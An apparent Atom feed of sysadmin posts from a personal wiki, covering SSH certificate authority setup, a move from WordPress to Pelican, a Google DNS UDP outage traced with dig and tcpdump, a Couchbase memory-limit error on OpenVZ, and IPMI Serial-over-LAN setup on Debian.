<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>wiki'd - sysadmin</title><link href="http://wiki.jokeru.ro/" rel="alternate"></link><link href="http://wiki.jokeru.ro/feeds/sysadmin.atom.xml" rel="self"></link><id>http://wiki.jokeru.ro/</id><updated>2017-04-04T12:12:00+01:00</updated><entry><title>Better SSH access control</title><link href="http://wiki.jokeru.ro/how-to-better-ssh-access-control.html" rel="alternate"></link><published>2017-04-04T12:12:00+01:00</published><updated>2017-04-04T12:12:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2017-04-04:/how-to-better-ssh-access-control.html</id><summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;the only truly secure server is one that is powered off and stored in a concrete room with no doors or windows&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;SSH access to your instance is so last year, right now you just fire a new one and drop the old one.
But if you insist in having …&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;the only truly secure server is one that is powered off and stored in a concrete room with no doors or windows&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;SSH access to your instance is so last year, right now you just fire a new one and drop the old one.
But if you insist in having SSH access, better make it safer (specially if your instance is publically exposed).&lt;/p&gt;
&lt;p&gt;Username &amp;amp; password is bad, private keys are better but certificates the best.
You just need to create a Root Certificate Authority that will be used to sign the access keys, in the signing process you are able to specify the user or hostname used for access and also an expiry date.&lt;/p&gt;
&lt;h4&gt;Let's create the Root SSH CA (on your secure management server):&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ssh-keygen -b &lt;span class="m"&gt;4096&lt;/span&gt; -t rsa -f /etc/jokeru-ssh-ca -C &lt;span class="s2"&gt;&amp;quot;JoKeru SSH CA Key&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; I recommand setting up a strong passphrase &lt;span class="k"&gt;for&lt;/span&gt; this key
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Configure all instances to &lt;strong&gt;trust&lt;/strong&gt; the CA:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; upload /etc/jokeru-ssh-ca.pub to /etc/ssh/ on all the instances
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;TrustedUserCAKeys /etc/ssh/jokeru-ssh-ca.pub&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /etc/ssh/sshd_config
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/ssh restart
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Sign a user key and use it for login (on your secure management server):&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; create the user key &lt;span class="o"&gt;(&lt;/span&gt;no need &lt;span class="k"&gt;for&lt;/span&gt; passphrase here&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; ssh-keygen -b &lt;span class="m"&gt;4096&lt;/span&gt; -t rsa -f /home/j/.ssh/id_rsa

&lt;span class="gp"&gt;#&lt;/span&gt; sign the key
&lt;span class="gp"&gt;$&lt;/span&gt; ssh-keygen -s /etc/jokeru-ssh-ca -n noc -V +1d -I j@wiki /home/j/.ssh/id_rsa.pub
&lt;span class="gp"&gt;#&lt;/span&gt; sets principal to &lt;span class="s2"&gt;&amp;quot;noc&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;target remote user to login&lt;span class="o"&gt;)&lt;/span&gt;, key is valid &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; day, sets key identifier to &lt;span class="s2"&gt;&amp;quot;j@wiki&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;good &lt;span class="k"&gt;for&lt;/span&gt; logging/audit&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; view the signed certificate details
&lt;span class="gp"&gt;$&lt;/span&gt; ssh-keygen -L -f /home/j/.ssh/id_rsa-cert.pub

&lt;span class="gp"&gt;#&lt;/span&gt; connect using the key
&lt;span class="gp"&gt;$&lt;/span&gt; ssh -i /home/j/.ssh/id_rsa noc@1.2.3.4
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://ef.gy/hardening-ssh"&gt;https://ef.gy/hardening-ssh&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="linux"></category><category term="ssh"></category><category term="access"></category><category term="security"></category></entry><entry><title>It's time to drop WordPress, say hello to my Pelican</title><link href="http://wiki.jokeru.ro/how-to-it-s-time-to-drop-wordpress-say-hello-to-my-pelican.html" rel="alternate"></link><published>2016-04-04T21:30:00+01:00</published><updated>2016-04-04T21:30:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2016-04-04:/how-to-it-s-time-to-drop-wordpress-say-hello-to-my-pelican.html</id><summary type="html">&lt;h4&gt;Short story&lt;/h4&gt;
&lt;p&gt;There is nothing more to say: WordPress is gone, Pelican is in.&lt;/p&gt;
&lt;h4&gt;Long story&lt;/h4&gt;
&lt;p&gt;Last year this wiki was running a self-hosted WordPress solution. But it got hacked.&lt;/p&gt;
&lt;p&gt;I never got the time to investigate how it happened (even though I had the auto-update feature enabled) but it …&lt;/p&gt;</summary><content type="html">&lt;h4&gt;Short story&lt;/h4&gt;
&lt;p&gt;There is nothing more to say: WordPress is gone, Pelican is in.&lt;/p&gt;
&lt;h4&gt;Long story&lt;/h4&gt;
&lt;p&gt;Last year this wiki was running a self-hosted WordPress solution. But it got hacked.&lt;/p&gt;
&lt;p&gt;I never got the time to investigate how it happened (even though I had the auto-update feature enabled) but it happend. I guess some malicious files were uploaded and used to execute code (php) on the box:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;it messed up the front-end pages&lt;/li&gt;
&lt;li&gt;it started sending spam in the background&lt;/li&gt;
&lt;li&gt;lots of spam&lt;/li&gt;
&lt;li&gt;I didn't have any backup of the template files, only the data (content) was safe&lt;/li&gt;
&lt;li&gt;I was using a custom theme which was pretty difficult to reconfigure&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So I decided to move everything to a new solution, free, and drop WordPress (which is a mess in terms of security).&lt;/p&gt;
&lt;p&gt;I was waiting for more than 1 year for &lt;a href="http://octopress.org/"&gt;Octopress 3.0&lt;/a&gt; to be released because I liked their theme and layout.&lt;/p&gt;
&lt;p&gt;But in the meantime I've discovered even a better product: &lt;a href="http://blog.getpelican.com/" title="Pelican 3.6.3"&gt;Pelican&lt;/a&gt;.
Pelican is a static site generator, written in Python, that requires no database or server-side logic.
And it has an Octopress theme. The site generated by Pelican can be server by &lt;a href="https://github.com/"&gt;Github&lt;/a&gt; using &lt;a href="https://pages.github.com/"&gt;Github Pages&lt;/a&gt;. You can find good references online about this implementation.&lt;/p&gt;
&lt;h4&gt;Here is what my install looked like on a debian box:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;apt-get install python-pip&lt;/span&gt;
&lt;span class="go"&gt;pip install virtualenv&lt;/span&gt;
&lt;span class="go"&gt;virtualenv ve-pelican&lt;/span&gt;
&lt;span class="go"&gt;cd ve-pelican/&lt;/span&gt;
&lt;span class="go"&gt;source bin/activate&lt;/span&gt;
&lt;span class="go"&gt;pip install pelican&lt;/span&gt;
&lt;span class="go"&gt;pip install Markdown&lt;/span&gt;
&lt;span class="go"&gt;pelican-quickstart&lt;/span&gt;
&lt;span class="go"&gt;git clone https://github.com/duilio/pelican-octopress-theme octopress&lt;/span&gt;
&lt;span class="go"&gt;pelican-themes -i octopress/ &amp;amp;&amp;amp; rm -r octopress/&lt;/span&gt;
&lt;span class="go"&gt;deactivate&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now you just need to add your content and play a little with the config files.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The king is dead, long live the king !&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="linux"></category><category term="wordpress"></category><category term="pelican"></category><category term="markdown"></category><category term="octopress"></category><category term="github pages"></category></entry><entry><title>Google DNS Down - 18 March 2016</title><link href="http://wiki.jokeru.ro/google-dns-down-18-march-2016.html" rel="alternate"></link><published>2016-03-18T09:30:00+00:00</published><updated>2016-03-18T09:30:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2016-03-18:/google-dns-down-18-march-2016.html</id><summary type="html">&lt;p&gt;If you're using the Google DNSs &lt;code&gt;8.8.8.8&lt;/code&gt; and &lt;code&gt;8.8.4.4&lt;/code&gt;, you might have an issue and you don't know about it :)&lt;/p&gt;
&lt;h4&gt;Here is what happened:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;I have some servers configured to use these DNSs (and I've been using them for ages now)&lt;/li&gt;
&lt;li&gt;I have some …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;If you're using the Google DNSs &lt;code&gt;8.8.8.8&lt;/code&gt; and &lt;code&gt;8.8.4.4&lt;/code&gt;, you might have an issue and you don't know about it :)&lt;/p&gt;
&lt;h4&gt;Here is what happened:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;I have some servers configured to use these DNSs (and I've been using them for ages now)&lt;/li&gt;
&lt;li&gt;I have some scripts fetching API data using linux cURL&lt;/li&gt;
&lt;li&gt;these scripts are sending alarms in case of failure - Monitoring is important !&lt;ul&gt;
&lt;li&gt;and this morning my inbox was full of alarms&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I've quickly pinpointed the cause of the errors:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;root@node-115:/#&lt;/span&gt; curl google.com -v
&lt;span class="go"&gt;* getaddrinfo(3) failed for google.com:80&lt;/span&gt;
&lt;span class="go"&gt;* Couldn&amp;#39;t resolve host &amp;#39;google.com&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;* Closing connection #0&lt;/span&gt;
&lt;span class="go"&gt;curl: (6) Couldn&amp;#39;t resolve host &amp;#39;google.com&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hmmm, Google couldn't resolve google.&lt;/p&gt;
&lt;p&gt;But running a dig command, it worked:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;root@node-115:/#&lt;/span&gt; dig google.com @8.8.4.4
&lt;span class="go"&gt;;; Truncated, retrying in TCP mode.&lt;/span&gt;

&lt;span class="go"&gt;; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.4-rpz2+rl005.12-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; google.com @8.8.4.4  &lt;/span&gt;
&lt;span class="go"&gt;;; global options: +cmd  &lt;/span&gt;
&lt;span class="go"&gt;;; Got answer:  &lt;/span&gt;
&lt;span class="go"&gt;;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 717  &lt;/span&gt;
&lt;span class="go"&gt;;; flags: qr rd ra; QUERY: 1, ANSWER: 11, AUTHORITY: 0, ADDITIONAL: 0&lt;/span&gt;

&lt;span class="go"&gt;;; QUESTION SECTION:  &lt;/span&gt;
&lt;span class="go"&gt;;google.com. IN A&lt;/span&gt;

&lt;span class="go"&gt;;; ANSWER SECTION:  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.72  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.78  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.67  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.69  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.68  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.64  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.66  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.70  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.73  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.65  &lt;/span&gt;
&lt;span class="go"&gt;google.com. 299 IN A 173.194.123.71&lt;/span&gt;

&lt;span class="go"&gt;;; Query time: 25 msec  &lt;/span&gt;
&lt;span class="go"&gt;;; SERVER: 8.8.4.4#53(8.8.4.4)  &lt;/span&gt;
&lt;span class="go"&gt;;; WHEN: Fri Mar 18 06:46:38 2016  &lt;/span&gt;
&lt;span class="go"&gt;;; MSG SIZE rcvd: 204  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;dig also revealed an issue: &lt;code&gt;Truncated, retrying in TCP mode&lt;/code&gt;, but I didn't notice it at that time&lt;/p&gt;
&lt;p&gt;Here is the tcpdump capture when running the dig command:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;06:46:38.152851 IP x.x.x.x.33479 &amp;gt; 8.8.4.4.53: 59819+ A? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.176171 IP 8.8.4.4.53 &amp;gt; x.x.x.x.33479: 59819-| 0/0/0 (28)&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.176431 IP x.x.x.x.49300 &amp;gt; 8.8.4.4.53: Flags [S], seq 664740351, win 14600, options [mss 1460,sackOK,TS val 4082166890 ecr 0,nop,wscale 9], length 0&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.199615 IP 8.8.4.4.53 &amp;gt; x.x.x.x.49300: Flags [S.], seq 4111433272, ack 664740352, win 42540, options [mss 1430,sackOK,TS val 1427658912 ecr 4082166890,nop,wscale 7], length 0&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.199646 IP x.x.x.x.49300 &amp;gt; 8.8.4.4.53: Flags [.], ack 1, win 29, options [nop,nop,TS val 4082166895 ecr 1427658912], length 0&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.199753 IP x.x.x.x.49300 &amp;gt; 8.8.4.4.53: Flags [P.], seq 1:31, ack 1, win 29, options [nop,nop,TS val 4082166895 ecr 1427658912], length 30717+ A? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.222951 IP 8.8.4.4.53 &amp;gt; x.x.x.x.49300: Flags [.], ack 31, win 333, options [nop,nop,TS val 1427658935 ecr 4082166895], length 0&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.225278 IP 8.8.4.4.53 &amp;gt; x.x.x.x.49300: Flags [P.], seq 1:207, ack 31, win 333, options [nop,nop,TS val 1427658938 ecr 4082166895], length 206717 11/0/0 A 173.194.123.72, A 173.194.123.78, A 173.194.123.67, A 173.194.123.69, A 173.194.123.68, A 173.194.123.64, A 173.194.123.66, A 173.194.123.70, A 173.194.123.73, A 173.194.123.65, A 173.194.123.71 (204)&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.225302 IP x.x.x.x.49300 &amp;gt; 8.8.4.4.53: Flags [.], ack 207, win 31, options [nop,nop,TS val 4082166902 ecr 1427658938], length 0&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.225723 IP x.x.x.x.49300 &amp;gt; 8.8.4.4.53: Flags [F.], seq 31, ack 207, win 31, options [nop,nop,TS val 4082166902 ecr 1427658938], length 0&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.248930 IP 8.8.4.4.53 &amp;gt; x.x.x.x.49300: Flags [F.], seq 207, ack 32, win 333, options [nop,nop,TS val 1427658961 ecr 4082166902], length 0&lt;/span&gt;
&lt;span class="go"&gt;06:46:38.248959 IP x.x.x.x.49300 &amp;gt; 8.8.4.4.53: Flags [.], ack 208, win 31, options [nop,nop,TS val 4082166908 ecr 1427658961], length 0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The first 2 lines are for the UDP request, and we can see the reply we get is &lt;code&gt;0/0/0&lt;/code&gt; and then it's switching to TCP.&lt;/p&gt;
&lt;p&gt;And here is the tcpdump capture when running the curl command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;06:47:16.561123 IP x.x.x.x.56375 &amp;gt; 8.8.4.4.53: 52634+ A? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.561137 IP x.x.x.x.56375 &amp;gt; 8.8.4.4.53: 42403+ AAAA? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.584480 IP 8.8.4.4.53 &amp;gt; x.x.x.x.56375: 52634-| 0/0/0 (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.584498 IP 8.8.4.4.53 &amp;gt; x.x.x.x.56375: 42403-| 0/0/0 (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.584590 IP x.x.x.x.48556 &amp;gt; 8.8.4.4.53: 52634+ A? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.584606 IP x.x.x.x.48556 &amp;gt; 8.8.4.4.53: 42403+ AAAA? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.607671 IP 8.8.4.4.53 &amp;gt; x.x.x.x.48556: 52634-| 0/0/0 (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.607731 IP 8.8.4.4.53 &amp;gt; x.x.x.x.48556: 42403-| 0/0/0 (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.607781 IP x.x.x.x.55720 &amp;gt; 8.8.4.4.53: 54224+ A? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.607793 IP x.x.x.x.55720 &amp;gt; 8.8.4.4.53: 3857+ AAAA? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.630826 IP 8.8.4.4.53 &amp;gt; x.x.x.x.55720: 3857-| 0/0/0 (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.630913 IP x.x.x.x.58704 &amp;gt; 8.8.4.4.53: 54224+ A? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.630928 IP x.x.x.x.58704 &amp;gt; 8.8.4.4.53: 3857+ AAAA? google.com. (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.630945 IP 8.8.4.4.53 &amp;gt; x.x.x.x.55720: 54224-| 0/0/0 (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.654146 IP 8.8.4.4.53 &amp;gt; x.x.x.x.58704: 3857-| 0/0/0 (28)&lt;/span&gt;
&lt;span class="go"&gt;06:47:16.654164 IP 8.8.4.4.53 &amp;gt; x.x.x.x.58704: 54224-| 0/0/0 (28)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusion:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;cURL uses UDP-only when resolving the URLs  &lt;/li&gt;
&lt;li&gt;Google DNSs - or at least the ones in my geo area (see traceroute below) are not serving requests over UDP  &lt;/li&gt;
&lt;li&gt;switching to a different resolver, OpenDNS for example (&lt;code&gt;208.67.222.222&lt;/code&gt; and &lt;code&gt;208.67.220.220&lt;/code&gt;), fixed my problem until Google fixes theirs&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;root@node-115:/#&lt;/span&gt; traceroute &lt;span class="m"&gt;8&lt;/span&gt;.8.8.8
&lt;span class="go"&gt;traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets&lt;/span&gt;
&lt;span class="go"&gt;1 10.8.13.9 (10.8.13.9) 0.764 ms 1.326 ms 1.376 ms&lt;/span&gt;
&lt;span class="go"&gt;2 10.8.34.253 (10.8.34.253) 0.625 ms 0.687 ms 0.687 ms&lt;/span&gt;
&lt;span class="go"&gt;3 10.8.40.233 (10.8.40.233) 0.144 ms 10.8.40.229 (10.8.40.229) 0.187 ms 10.8.40.233 (10.8.40.233) 1.917 ms&lt;/span&gt;
&lt;span class="go"&gt;4 10.8.25.197 (10.8.25.197) 0.212 ms 0.221 ms 0.257 ms&lt;/span&gt;
&lt;span class="go"&gt;5 207.86.156.45 (207.86.156.45) 15.464 ms 207.86.157.49 (207.86.157.49) 0.286 ms 207.86.156.45 (207.86.156.45) 15.450 ms&lt;/span&gt;
&lt;span class="go"&gt;6 216.156.1.126.ptr.us.xo.net (216.156.1.126) 13.294 ms 13.264 ms 216.156.0.253.ptr.us.xo.net (216.156.0.253) 15.731 ms&lt;/span&gt;
&lt;span class="go"&gt;7 ae0d0.cir1.chicago2-il.us.xo.net (207.88.13.250) 13.134 ms 13.102 ms 12.952 ms&lt;/span&gt;
&lt;span class="go"&gt;8 216.1.94.142 (216.1.94.142) 13.133 ms 13.267 ms ae0d0.cir1.chicago2-il.us.xo.net (207.88.13.250) 13.014 ms&lt;/span&gt;
&lt;span class="go"&gt;9 216.1.94.142 (216.1.94.142) 13.259 ms 209.85.143.154 (209.85.143.154) 13.163 ms 209.85.143.186 (209.85.143.186) 13.102 ms&lt;/span&gt;
&lt;span class="go"&gt;10 209.85.241.47 (209.85.241.47) 13.899 ms 209.85.254.128 (209.85.254.128) 13.873 ms 209.85.254.120 (209.85.254.120) 13.692 ms&lt;/span&gt;
&lt;span class="go"&gt;11 72.14.233.68 (72.14.233.68) 13.449 ms 209.85.247.10 (209.85.247.10) 23.052 ms 22.934 ms&lt;/span&gt;
&lt;span class="go"&gt;12 72.14.234.81 (72.14.234.81) 24.983 ms 216.239.47.45 (216.239.47.45) 23.377 ms 209.85.247.4 (209.85.247.4) 23.355 ms&lt;/span&gt;
&lt;span class="go"&gt;13 216.239.49.25 (216.239.49.25) 23.135 ms 72.14.234.81 (72.14.234.81) 24.944 ms 216.239.43.219 (216.239.43.219) 23.540 ms&lt;/span&gt;
&lt;span class="go"&gt;14 google-public-dns-a.google.com (8.8.8.8) 23.089 ms 23.088 ms *&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;there are other people complaining also @&lt;a href="https://twitter.com/search?q=google%20dns"&gt;https://twitter.com/search?q=google%20dns&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="linux"></category><category term="google"></category><category term="dns"></category><category term="down"></category><category term="curl"></category><category term="tcpdump"></category></entry><entry><title>Couchbase install error on OpenVZ</title><link href="http://wiki.jokeru.ro/how-to-couchbase-install-error-on-openvz.html" rel="alternate"></link><published>2015-11-02T21:21:00+00:00</published><updated>2015-11-02T21:21:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-11-02:/how-to-couchbase-install-error-on-openvz.html</id><summary type="html">&lt;p&gt;While trying to migrate an Infrastructure away from Amazon (their service is not at all that cheap) to a container based one @&lt;a href="https://wable.com/"&gt;Wable&lt;/a&gt; (good offer and they "swear" they'll never over-commit), one of the components failed - it was a Couchbase server.&lt;/p&gt;
&lt;h4&gt;Let's follow the process (and the debug):&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; dpkg -i …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;While trying to migrate an Infrastructure away from Amazon (their service is not at all that cheap) to a container based one @&lt;a href="https://wable.com/"&gt;Wable&lt;/a&gt; (good offer and they "swear" they'll never over-commit), one of the components failed - it was a Couchbase server.&lt;/p&gt;
&lt;h4&gt;Let's follow the process (and the debug):&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; dpkg -i couchbase-server-community_2.2.0_x86_64.deb
&lt;span class="go"&gt;...&lt;/span&gt;
&lt;span class="go"&gt;Setting up couchbase-server (2.2.0) ...&lt;/span&gt;
&lt;span class="go"&gt;* Failed to start couchbase-server: timed out&lt;/span&gt;
&lt;span class="go"&gt;dpkg: error processing package couchbase-server (--configure):&lt;/span&gt;
&lt;span class="go"&gt;subprocess installed post-installation script returned error exit status 1&lt;/span&gt;
&lt;span class="go"&gt;Processing triggers for libc-bin (2.19-0ubuntu6.6) ...&lt;/span&gt;
&lt;span class="go"&gt;Errors were encountered while processing:&lt;/span&gt;
&lt;span class="go"&gt;couchbase-server&lt;/span&gt;
&lt;span class="go"&gt;E: Sub-process /usr/bin/dpkg returned an error code (1)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Somewhere in the logs &lt;code&gt;/opt/couchbase/var/lib/couchbase/logs/info.1&lt;/code&gt;: &lt;code&gt;"load_failed, Failed to load NIF library: '/opt/couchbase/lib/erlang/lib/crypto-2.0.4/priv/lib/crypto.so: failed to map segment from shared object: Cannot allocate memory'"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Googled a bit the error, got some hints to check the container limits:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /proc/user_beancounters &lt;span class="p"&gt;|&lt;/span&gt; egrep &lt;span class="s1"&gt;&amp;#39;fail|locked&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;uid resource held maxheld barrier limit failcnt&lt;/span&gt;
&lt;span class="go"&gt;lockedpages 0 2048 2048 2048 27258&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Opened a ticket with Wable, limits were raised fast (no questions asked), then:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /proc/user_beancounters &lt;span class="p"&gt;|&lt;/span&gt; egrep &lt;span class="s1"&gt;&amp;#39;fail|locked&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;uid resource held maxheld barrier limit failcnt&lt;/span&gt;
&lt;span class="go"&gt;lockedpages 0 2048 2560000 2560000 27258&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;That's it, now I can retry the install.&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="couchbase"></category><category term="error"></category><category term="openvz"></category><category term="ubuntu"></category></entry><entry><title>IPMI SOL on Debian</title><link href="http://wiki.jokeru.ro/how-to-ipmi-sol-on-debian.html" rel="alternate"></link><published>2015-09-18T22:31:00+01:00</published><updated>2015-09-18T22:31:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-09-18:/how-to-ipmi-sol-on-debian.html</id><summary type="html">&lt;p&gt;IPMI (Intelligent Platform Management Interface) provides out-of-band management and monitoring of servers (Supermicro X9SCL/X9SCM in my case). This is similar to Dell's DRAC or HP's iLO, but cheaper.&lt;/p&gt;
&lt;p&gt;SOL (Serial over LAN) is a mechanism that enables the input and output of the serial port of a managed system …&lt;/p&gt;</summary><content type="html">&lt;p&gt;IPMI (Intelligent Platform Management Interface) provides out-of-band management and monitoring of servers (Supermicro X9SCL/X9SCM in my case). This is similar to Dell's DRAC or HP's iLO, but cheaper.&lt;/p&gt;
&lt;p&gt;SOL (Serial over LAN) is a mechanism that enables the input and output of the serial port of a managed system to be redirected over IP.
SOL can be accessed with Java (using the IPMI web interface) or with the linux "ipmitool" binary. Since Java is a nightmare to make it work, I've opted for the second method.&lt;/p&gt;
&lt;p&gt;I was an &lt;code&gt;operator&lt;/code&gt; of that server, not the administrator, so the IPMI and SOL configuration was unknown. I had only the IPMI IP, Username and Password (and root access on the operating system). I needed to guess how the console redirection was made (I think that the server is shipped SOL-enabled, but I was not able to find this information for my server model).&lt;/p&gt;
&lt;p&gt;By default, you only get access to BIOS, the boot loader and/or the booted system requires additional settings.&lt;/p&gt;
&lt;h4&gt;Get OS redirection:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; server was configured to redirect console to &lt;span class="nv"&gt;COM2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; ttyS2
&lt;span class="gp"&gt;#&lt;/span&gt; and it used &lt;span class="m"&gt;115200&lt;/span&gt; as a bit-rate
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;T0:23:respawn:/sbin/getty -L ttyS2 115200 vt100&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /etc/inittab
&lt;span class="gp"&gt;$&lt;/span&gt; reboot
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;jokeru@local:~$&lt;/span&gt; ipmitool -C &lt;span class="m"&gt;3&lt;/span&gt; -I lanplus -H &lt;span class="m"&gt;101&lt;/span&gt;.102.103.104 -U IPMI_USER -P IPMI_PASS -L operator sol activate
